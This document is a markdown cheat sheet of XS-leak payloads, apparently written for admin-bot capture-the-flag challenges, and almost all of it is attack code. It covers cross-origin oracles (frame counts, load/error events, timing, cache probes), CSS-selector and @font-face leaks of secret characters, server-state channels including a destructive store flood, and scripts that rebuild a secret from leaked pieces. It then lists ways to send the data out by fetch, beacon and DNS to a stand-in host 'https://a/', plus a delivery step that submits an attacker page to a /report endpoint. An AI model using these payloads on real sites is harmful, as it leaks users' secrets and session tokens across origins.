# Payload variants — the XS-leak payloads, exhaustively

Every payload by oracle family — the complete enumeration.

---

## A. The classic client-side measures — one per oracle

```js
// === frames.length — a count oracle ===
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentWindow.frames.length);
document.body.appendChild(f);
// a hit renders N frames; a miss renders 0

// === onload/onerror — a hit/miss oracle (an <img>) ===
var i=new Image();
i.onload=()=>exfil(g+'=H'); i.onerror=()=>exfil(g+'=M');
i.src='https://t/api/search?q='+encodeURIComponent(g);

// === a <script> variant — same events ===
var s=document.createElement('script');
s.onload=()=>exfil(g+'=H'); s.onerror=()=>exfil(g+'=M');
s.src='https://t/api/search?q='+encodeURIComponent(g);
document.body.appendChild(s);

// === an <iframe> variant — a page-load oracle ===
var f=document.createElement('iframe');
f.onload=()=>exfil(g+'=H'); f.onerror=()=>exfil(g+'=M');
f.src='https://t/search?q='+encodeURIComponent(g);
document.body.appendChild(f);

// === a <link> variant — a stylesheet-load oracle ===
var l=document.createElement('link');
l.rel='stylesheet';
l.onload=()=>exfil(g+'=H'); l.onerror=()=>exfil(g+'=M');
l.href='https://t/r/'+encodeURIComponent(g);
document.head.appendChild(l);

// === a <video>/<audio>/<object> variant ===
var v=document.createElement('video');
v.onload=()=>exfil(g+'=H'); v.onerror=()=>exfil(g+'=M');
v.src='https://t/r/'+encodeURIComponent(g);
document.body.appendChild(v);

// === a timing oracle — a slow-vs-fast response ===
var t0=performance.now();
fetch('https://t/api/search?q='+encodeURIComponent(g),{mode:'no-cors'})
 .finally(()=>exfil(g+'='+Math.round(performance.now()-t0)));

// === a cache-probe — a cached-vs-uncached timing ===
var t0=performance.now(); var i=new Image();
i.onload=()=>exfil(g+'='+Math.round(performance.now()-t0));
i.src='https://t/r/'+encodeURIComponent(g)+'?cb='+Math.random();

// === a window.open — a navigation/redirect check ===
var w=window.open('https://t/x?q='+encodeURIComponent(g));
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);

// === a history/:visited — a link styled differently ===
var a=document.createElement('a');
a.href='https://t/search?q='+encodeURIComponent(g);
a.id='v'; document.body.appendChild(a);
// a :visited style on #v differs from an unvisited one

// === a scrollHeight — a content-size side-channel ===
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentDocument.body.scrollHeight);
document.body.appendChild(f);

// === a performance-resource-timing read ===
performance.getEntriesByName('https://t/r/'+encodeURIComponent(g))
 .forEach(e=>exfil(e.name+'='+e.duration));
```

## B. The CSS-selector payloads — the declarative channel

```css
/* === the prefix oracle === */
body[secret^="a"]{--m:url('/leak/a')}
body[secret^="ab"]{--m:url('/leak/ab')}
/* === the suffix oracle === */
body[secret$="f"]{--m:url('/leak/f')}
/* === the substring oracle === */
body[secret*="abc"]{--m:url('/leak/abc')}
/* === the exact-match oracle === */
body[secret="full-token"]{--m:url('/leak/full')}
/* === the char-in-set oracle === */
body[secret*="a"]{--m:url('/leak/has-a')}
/* === the consumer — a multi-layer background === */
#trig{background-image:var(--m_a,none),var(--m_ab,none),var(--m_f,none),var(--m_abc,none)}
```

## C. The @font-face unicode-range payloads — the char-set channel

```css
/* one @font-face per alphabet char — each its own unicode-range+URL */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
@font-face{font-family:x;src:url('/leak/62');unicode-range:U+0062}
@font-face{font-family:x;src:url('/leak/63');unicode-range:U+0063}
/* ... through the whole 62-char alphabet (a-z, A-Z, 0-9) */
#secret{font-family:x;display:block !important}
/* the browser downloads a face ONLY when a char inside its
   unicode-range renders — the requested font URLs ARE the set */
```

## D. The server-state payloads — the sealed channel

```bash
# === the LRU-eviction channel ===
# flood the store → the survivors are the bot's GETs — thousands of bits
# (the blast_radius: the flood destroys every other key)

# === the counter channel ===
# a GET that increments a readable counter → 'the counter is N+1'

# === the one-shot token channel ===
# a GETDEL/single-use nonce → 'did it survive the visit' — one bit

# === the rate-limit channel ===
# a bucket with a remaining count → the consumed quota

# === the 'last seen' channel ===
# a timestamp a GET updates → the recency read
```

## E. The reconstruction payloads — the secret-assembly

```python
# === a binary-search boolean oracle ===
charset='abcdefghijklmnopqrstuvwxyz0123456789'
known=''
while len(known)<32:
    for c in charset:
        if oracle(known+c): known+=c; break

# === a sorted secret — the char-set direct answer ===
token=''.join(sorted(leaked_chars))

# === an n-gram beam search — overlapping substrings ===
def beam(ngrams,w=10,L=32):
    beam=[('',0.)]
    for _ in range(L):
        cand=[]
        for s,sc in beam:
            for ng in ngrams:
                if ng[:-1]==s[-len(ng)+1:]:
                    cand.append((s+ng[-1],sc+score(ng)))
        beam=sorted(cand,key=lambda x:-x[1])[:w]
    return beam[0][0]
```

## F. The exfil payloads — the read-back channel

```js
// === a GET to the listener ===
fetch('https://a/?'+encodeURIComponent(d))
// === an img GET ===
new Image().src='https://a/?'+encodeURIComponent(d)
// === a beacon ===
navigator.sendBeacon('https://a/',d)
// === a postMessage ===
parent.postMessage(d,'*')
// === a DNS exfil ===
new Image().src='https://'+btoa(d)+'.a.com/'
// === a write-back to the target ===
fetch('https://t/api/comment',{method:'POST',body:JSON.stringify({t:d})})
// === a DOM-writeback — a screenshotting bot ===
document.body.innerHTML='<div style="position:fixed;inset:0;background:#fff;font-size:80px">'+d+'</div>'
```

## G. The delivery payloads — the page's path to the bot

```bash
# === a /report endpoint ===
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# === a data: URL — an airgapped/null-origin case ===
curl -X POST "$BASE/report" --data-urlencode 'url=data:text/html,<html>...'
# === a stored page — same-origin ===
# === a fragment — a #id the bot's page reads ===
curl -X POST "$BASE/report" -d 'url=https://target/page#' + fragment
```
